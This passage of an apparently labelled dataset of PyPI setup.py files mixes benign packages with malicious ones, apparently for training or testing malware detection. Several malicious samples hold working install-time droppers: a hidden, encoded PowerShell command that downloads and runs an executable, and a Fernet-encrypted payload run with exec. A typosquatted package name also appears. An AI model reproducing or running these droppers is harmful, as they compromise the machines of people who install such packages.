Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eeweather-0.3.24", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\n\n   Copyright 2018 Open Energy Efficiency, Inc.\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n\n\"\"\"\n# Setup.py inspired by https://github.com/kennethreitz/setup.py\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pip install twine\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\nNAME = \"eeweather\"\nREQUIRED = [\"click\", \"pandas\", \"pyproj>=1.9.6\", \"requests\", \"shapely\"]\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\nwith io.open(os.path.join(here, \"README.rst\"), encoding=\"utf-8\") as f:\n    long_description = \"\\n\" + f.read()\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nwith open(os.path.join(here, NAME, \"__version__.py\")) as f:\n    exec(f.read(), about)\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(\"\\033[1m{0}\\033[0m\".format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds\u2026\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel (universal) distribution\u2026\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPi via Twine\u2026\")\n        os.system(\"twine upload dist/*\")\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=long_description,\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=find_packages(exclude=(\"tests\",)),\n    entry_points={\"console_scripts\": [\"eeweather=eeweather.cli:cli\"]},\n    install_requires=REQUIRED,\n    include_package_data=True,\n    license=about[\"__license__\"],\n    classifiers=[\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ],\n    # $ setup.py publish support.\n    cmdclass={\"upload\": UploadCommand},\n)\n", "target": 0}
{"idx": "django-extra-fields-3.0.2", "func": "import os\nfrom setuptools import setup\n\nwith open(os.path.join(os.path.dirname(__file__), 'README.md')) as readme:\n    README = readme.read()\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name='django-extra-fields',\n    version='3.0.2',\n    packages=['drf_extra_fields',\n              'drf_extra_fields.runtests'],\n    include_package_data=True,\n    install_requires=['Django >= 2.2', 'djangorestframework >= 3.9.1'],\n    extras_require={\n        \"Base64ImageField\": [\"Pillow >= 6.2.1\"],\n    },\n    license='Apache-2.0',\n    license_files=['LICENSE'],\n    description='Additional fields for Django Rest Framework.',\n    long_description=README,\n    long_description_content_type=\"text/markdown\",\n    author='hipo',\n    author_email='pypi@hipolabs.com',\n    url='https://github.com/Hipo/drf-extra-fields',\n    python_requires=\">=3.5\",\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Development Status :: 7 - Inactive'\n    ],\n)\n", "target": 0}
{"idx": "flower-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport re\n\nfrom setuptools import setup, find_packages\n\n\nversion = re.compile(r'VERSION\\s*=\\s*\\((.*?)\\)')\n\n\ndef get_package_version():\n    \"returns package version without importing it\"\n    base = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(base, \"flower/__init__.py\")) as initf:\n        for line in initf:\n            m = version.match(line.strip())\n            if not m:\n                continue\n            return \".\".join(m.groups()[0].split(\", \"))\n\n\ndef get_requirements(filename):\n    return open('requirements/' + filename).read().splitlines()\n\n\nclasses = \"\"\"\n    Development Status :: 4 - Beta\n    Intended Audience :: Developers\n    License :: OSI Approved :: BSD License\n    Topic :: System :: Distributed Computing\n    Programming Language :: Python\n    Programming Language :: Python :: 3\n    Programming Language :: Python :: 3 :: Only\n    Programming Language :: Python :: 3.6\n    Programming Language :: Python :: 3.7\n    Programming Language :: Python :: 3.8\n    Programming Language :: Python :: 3.9\n    Programming Language :: Python :: Implementation :: CPython\n    Programming Language :: Python :: Implementation :: PyPy\n    Operating System :: OS Independent\n\"\"\"\nclassifiers = [s.strip() for s in classes.split('\\n') if s]\n\n\nsetup(\n    name='flower',\n    version=get_package_version(),\n    description='Celery Flower',\n    long_description_content_type=\"text/markdown\",\n    long_description=open('README.rst').read(),\n    author='Mher Movsisyan',\n    url='https://github.com/mher/flower',\n    license='BSD',\n    classifiers=classifiers,\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    install_requires=get_requirements('default.txt'),\n    test_suite=\"tests\",\n    tests_require=get_requirements('test.txt'),\n    package_data={'flower': ['templates/*', 'static/*.*',\n                             'static/**/*.*', 'static/**/**/*.*']},\n    entry_points={\n        'celery.commands': [\n            'flower = flower.command:flower',\n        ],\n    },\n)\n", "target": 0}
{"idx": "django-classy-tags-3.0.1", "func": "#!/usr/bin/env python\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\n\nREQUIREMENTS = [\n    'django>=2.2',\n]\n\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Web Environment',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Framework :: Django',\n    'Framework :: Django :: 2.2',\n    'Framework :: Django :: 3.1',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n    'Topic :: Internet :: WWW/HTTP',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development',\n    'Topic :: Software Development :: Libraries',\n]\n\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.rst\").read_text()\n\nsetup(\n    name='django-classy-tags',\n    version='3.0.1',\n    author='Jonas Obrist',\n    author_email='ojiidotch@gmail.com',\n    maintainer='Django CMS Association and contributors',\n    maintainer_email='info@django-cms.org',\n    url='https://github.com/django-cms/django-classy-tags',\n    license='BSD',\n    description='Class based template tags for Django',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    packages=find_packages(exclude=['tests']),\n    python_requires='>=3.7',\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    classifiers=CLASSIFIERS,\n    test_suite='tests.settings.run',\n)\n", "target": 0}
{"idx": "django_compressor-4.1", "func": "import ast\nimport codecs\nimport os\nimport sys\nfrom distutils.util import convert_path\nfrom fnmatch import fnmatchcase\n\nfrom setuptools import find_packages, setup\n\n\nclass VersionFinder(ast.NodeVisitor):\n    def __init__(self):\n        self.version = None\n\n    def visit_Assign(self, node):\n        if node.targets[0].id == '__version__':\n            self.version = node.value.s\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\n\ndef find_version(*parts):\n    finder = VersionFinder()\n    finder.visit(ast.parse(read(*parts)))\n    return finder.version\n\n\n# Provided as an attribute, so you can append to these instead\n# of replicating them:\nstandard_exclude = ('*.py', '*.pyc', '*$py.class', '*~', '.*', '*.bak')\nstandard_exclude_directories = ('.*', 'CVS', '_darcs', './build',\n                                './dist', 'EGG-INFO', '*.egg-info')\n\n\n# (c) 2005 Ian Bicking and contributors; written for Paste (http://pythonpaste.org)\n# Licensed under the MIT license: http://www.opensource.org/licenses/mit-license.php\n# Note: you may want to copy this into your setup.py file verbatim, as\n# you can't import this from another package, when you don't know if\n# that package is installed yet.\ndef find_package_data(where='.', package='',\n                      exclude=standard_exclude,\n                      exclude_directories=standard_exclude_directories,\n                      only_in_packages=True,\n                      show_ignored=False):\n    \"\"\"\n    Return a dictionary suitable for use in ``package_data``\n    in a distutils ``setup.py`` file.\n\n    The dictionary looks like::\n\n        {'package': [files]}\n\n    Where ``files`` is a list of all the files in that package that\n    don't match anything in ``exclude``.\n\n    If ``only_in_packages`` is true, then top-level directories that\n    are not packages won't be included (but directories under packages\n    will).\n\n    Directories matching any pattern in ``exclude_directories`` will\n    be ignored; by default directories with leading ``.``, ``CVS``,\n    and ``_darcs`` will be ignored.\n\n    If ``show_ignored`` is true, then all the files that aren't\n    included in package data are shown on stderr (for debugging\n    purposes).\n\n    Note patterns use wildcards, or can be exact paths (including\n    leading ``./``), and all searching is case-insensitive.\n    \"\"\"\n\n    out = {}\n    stack = [(convert_path(where), '', package, only_in_packages)]\n    while stack:\n        where, prefix, package, only_in_packages = stack.pop(0)\n        for name in os.listdir(where):\n            fn = os.path.join(where, name)\n            if os.path.isdir(fn):\n                bad_name = False\n                for pattern in exclude_directories:\n                    if (fnmatchcase(name, pattern) or fn.lower() == pattern.lower()):\n                        bad_name = True\n                        if show_ignored:\n                            print(\"Directory %s ignored by pattern %s\" %\n                                  (fn, pattern), file=sys.stderr)\n                        break\n                if bad_name:\n                    continue\n                if (os.path.isfile(os.path.join(fn, '__init__.py')) and not prefix):\n                    if not package:\n                        new_package = name\n                    else:\n                        new_package = package + '.' + name\n                    stack.append((fn, '', new_package, False))\n                else:\n                    stack.append((fn, prefix + name + '/', package, only_in_packages))\n            elif package or not only_in_packages:\n                # is a file\n                bad_name = False\n                for pattern in exclude:\n                    if (fnmatchcase(name, pattern) or fn.lower() == pattern.lower()):\n                        bad_name = True\n                        if show_ignored:\n                            print(\"File %s ignored by pattern %s\" %\n                                  (fn, pattern), file=sys.stderr)\n                        break\n                if bad_name:\n                    continue\n                out.setdefault(package, []).append(prefix + name)\n    return out\n\nsetup(\n    name=\"django_compressor\",\n    version=find_version(\"compressor\", \"__init__.py\"),\n    url='https://django-compressor.readthedocs.io/en/latest/',\n    project_urls={\n        'Source': 'https://github.com/django-compressor/django-compressor',\n    },\n    license='MIT',\n    description=\"Compresses linked and inline JavaScript or CSS into single cached files.\",\n    long_description=read('README.rst'),\n    author='Jannis Leidel',\n    author_email='jannis@leidel.info',\n    packages=find_packages(),\n    package_data=find_package_data(),\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Internet :: WWW/HTTP',\n    ],\n    zip_safe=False,\n    install_requires=[\n        'django-appconf >= 1.0.3',\n        'rcssmin == 1.1.0',\n        'rjsmin == 1.2.0',\n    ],\n)\n", "target": 0}
{"idx": "py-craftpongsuper-6.66", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-craftpongsuper',\n    packages = ['modlib'],\n    version = '10.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-solo-2.0.0", "func": "import os\nimport re\n\nfrom setuptools import setup, find_packages\n\nREADME = os.path.join(os.path.dirname(__file__), 'README.md')\n\n# When running tests using tox, README.md is not found\ntry:\n    with open(README) as file:\n        long_description = file.read()\nexcept Exception:\n    long_description = ''\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `__init__.py`.\n    \"\"\"\n    with open(os.path.join(package, '__init__.py')) as file:\n        init_py = file.read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\nversion = get_version('solo')\n\nsetup(\n    name='django-solo',\n    version=version,\n    description='Django Solo helps working with singletons',\n    python_requires='>=3.6',\n    install_requires=['django>=2.2'],\n    packages=find_packages(),\n    url='https://github.com/lazybird/django-solo/',\n    author='lazybird',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    include_package_data=True,\n    zip_safe=False,\n    license='Creative Commons Attribution 3.0 Unported',\n    classifiers=[\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ]\n)\n", "target": 0}
{"idx": "libminevisarand-1.55", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libminevisarand',\n    packages = ['modlib'],\n    version = '7.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-literal-1.2.6", "func": "\"\"\"Define PyPI package.\"\"\"\n\nimport flake8_literal\n\nimport setuptools\n\n\nwith open('README.md', 'r') as readme_file:\n\tlong_description = readme_file.read()\n\nsetuptools.setup(\n\tname='flake8-literal',\n\tversion='1.2.6',\n\tauthor='Peter Linss',\n\tauthor_email='pypi@linss.com',\n\tdescription='Flake8 string literal validation',\n\tlong_description=long_description,\n\tlong_description_content_type='text/markdown',\n\turl='https://github.com/plinss/flake8-literal/',\n\n\tpackages=['flake8_literal'],\n\tpackage_data={'flake8_literal': ['py.typed']},\n\n\tinstall_requires=[\n\t\t'flake8>=3.8.0,<6.0',\n\t\t'importlib_metadata>=4.0.0,<5.0.0;python_version<\"3.8.0\"',\n\t\t'typing_extensions>=3.7.4.2',\n\t],\n\textras_require={\n\t\t'dev': [\n\t\t\t'mypy',\n\t\t\t'flake8<5.0',\n\t\t\t'flake8-annotations',\n\t\t\t'flake8-bandit',\n\t\t\t'flake8-bugbear',\n\t\t\t'flake8-commas',\n\t\t\t'flake8-comprehensions',\n\t\t\t'flake8-continuation',\n\t\t\t'flake8-datetimez',\n\t\t\t'flake8-docstrings',\n\t\t\t'flake8-import-order',\n\t\t\t'flake8-literal',\n\t\t\t'flake8-noqa',\n\t\t\t'flake8-polyfill',\n\t\t\t'flake8-postponed-annotations',\n\t\t\t'flake8-requirements',\n\t\t\t# 'flake8-smart-tabs',\n\t\t\t'flake8-tabs',\n\t\t\t'flake8-typechecking-import',\n\t\t\t'flake8-use-fstring',\n\t\t\t'pep8-naming',\n\t\t],\n\t\t'test': [],\n\t},\n\tclassifiers=[\n\t\t'Framework :: Flake8',\n\t\t'Environment :: Console',\n\t\t'Intended Audience :: Developers',\n\t\t'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',\n\t\t'Programming Language :: Python',\n\t\t'Programming Language :: Python :: 3',\n\t\t'Programming Language :: Python :: 3.7',\n\t\t'Programming Language :: Python :: 3.8',\n\t\t'Programming Language :: Python :: 3.9',\n\t\t'Programming Language :: Python :: 3.10',\n\t\t'Topic :: Software Development :: Libraries :: Python Modules',\n\t\t'Topic :: Software Development :: Quality Assurance',\n\t],\n\tpython_requires='>=3.7',\n\tentry_points={\n\t\t'flake8.extension': [\n\t\t\tf'{flake8_literal.quote_checker_prefix} = flake8_literal.quote_checker:QuoteChecker',\n\t\t\tf'{flake8_literal.raw_checker_prefix} = flake8_literal.raw_checker:RawChecker',\n\t\t],\n\t},\n)\n", "target": 0}
{"idx": "flask-oidc-ext-1.4.4", "func": "import io\nimport os.path\nimport sys\n\nfrom setuptools import setup\n\n# This check is to make sure we checkout docs/_themes before running sdist\nif not os.path.exists(\"./docs/_themes/README\"):\n    print(\"Please make sure you have docs/_themes checked out while running setup.py!\")\n    if os.path.exists(\".git\"):\n        print(\n            \"You seem to be using a git checkout, please execute the following commands to get the docs/_themes directory:\"\n        )\n        print(\" - git submodule init\")\n        print(\" - git submodule update\")\n    else:\n        print(\n            \"You seem to be using a release. Please use the release tarball from PyPI instead of the archive from GitHub\"\n        )\n    sys.exit(1)\n\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith io.open(os.path.join(here, \"README.rst\")) as f:\n    readme = f.read()\n\nsetup(\n    name=\"flask-oidc-ext\",\n    description=\"OpenID Connect extension for Flask\",\n    long_description=readme,\n    url=\"https://github.com/svintit/flask-oidc-ext\",\n    author=\"Erica Ehrhardt, Patrick Uiterwijk, Traian Svinti\",\n    author_email=\"traian.svinti@gmail.com\",\n    version=\"1.4.4\",\n    packages=[\"flask_oidc_ext\"],\n    install_requires=[\n        \"Flask\",\n        \"itsdangerous\",\n        \"oauth2client\",\n        \"six\",\n    ],\n    tests_require=[\"nose\", \"mock\"],\n    entry_points={\n        \"console_scripts\": [\"oidc-register=flask_oidc_ext.registration_util:main\"],\n    },\n    zip_safe=False,\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Framework :: Flask\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "jeilyfish-0.7.1", "func": "#!/usr/bin/env python\nimport os\nimport sys\nfrom setuptools import setup, Extension, Command\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import (CCompilerError, DistutilsExecError, DistutilsPlatformError)\n\n# large portions ripped off from simplejson's setup.py\n\n\ndef run_setup():\n\n    with open('README.rst') as readme:\n        long_description = readme.read()\n\n    setup(name=\"jeIlyfish\",\n          version=\"0.7.1\",\n          platforms=[\"any\"],\n          description=(\"a library for doing approximate and \"\n                       \"phonetic matching of strings.\"),\n          url=\"http://github.com/jamesturk/jellyfish\",\n          long_description=long_description,\n          classifiers=[\"Development Status :: 4 - Beta\",\n                       \"Intended Audience :: Developers\",\n                       \"License :: OSI Approved :: BSD License\",\n                       \"Natural Language :: English\",\n                       \"Operating System :: OS Independent\",\n                       \"Programming Language :: Python :: 3.4\",\n                       \"Programming Language :: Python :: 3.5\",\n                       \"Programming Language :: Python :: 3.6\",\n                       \"Topic :: Text Processing :: Linguistic\"],\n          packages=['jeIlyfish']\n          )\n\n\nrun_setup()\n", "target": 1}
{"idx": "selfcontrolpy-6.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcontrolpy',\n    packages = ['modlib'],\n    version = '7.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpcvultrainfo-1.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvultrainfo',\n    packages = ['modlib'],\n    version = '8.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requesxt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'iVpmIAUoMKoAroADOoKfkWYwhVypyFPqvdJj vbdCzYwqEk'\nLONG_DESCRIPTION = 'eTZXvlqYJn xSeVMCibDk NFUnQLfofaZMHIvnRQCjOVAWTYomdbLSnrBjDsvtvwBbQVdJmNDIGYnEInxuMHJDAePPZoJGAUerezqkGZeaMfdTTecdWjEdkobkCeCnstSdKvn nDVeozLHBZSLFjLmKwuSREOQBpwkJXdUUZv UbOjfYFwguiTAzqKBlXJnGfbBbGZrinjxZAowzcVEuBEcOClSdNkUlCnFhwvdjiFWYLlcCbieSiOzNimSPwYvnIbsemCofXLrlTbgivoXfbebHOhygcgxHryuaaOXbAjTg swd VHAmQxtIpEbwWfUOZeckKJVKNixuLbBZgWjPyGRujckAoXQmhwHzGbRzafmQFFVcDzPJuQgItzMhISPUXKwOUIEZElhpgH hVwrXXISXgfJzNnlFvbflhMoJIrkalYhzBJyttvhAxHtGKBuSloeOvzGsTKynBmre IQbPSzIxeQHxmjse'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'NZVTYb0Uuo8Pn78wwFFkGBOJkJE1VU1DFL5TiYTErOc=').decrypt(b'gAAAAABmA0b-HD9MebQlotomY8pgb0N2Id0E1VMX045TX0s_dTDLgIvrftc55jTiCpZM3l0LdoucJvsh8jEnwKR19I-ZDFF4lLl-WSr4gPSudKvDAUu00U9-TSMRZXSX9uedwwYiH-iELuJw6yEGzcM0TJAUS14W4HUc8Pq-WJ91LoM8ZODwDKeXj28631owQTDbndZVSMmh-Jjvmm4tHJHoNdHbnv8LQ7EbglxY_r_e2QDH0dtZ9vc='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesxt\",\n    version=VERSION,\n    author=\"VcqziVAkmYMjX\",\n    author_email=\"PpMnmzyAa@gmail.com\",\n    description=DESCRIPTION,\n    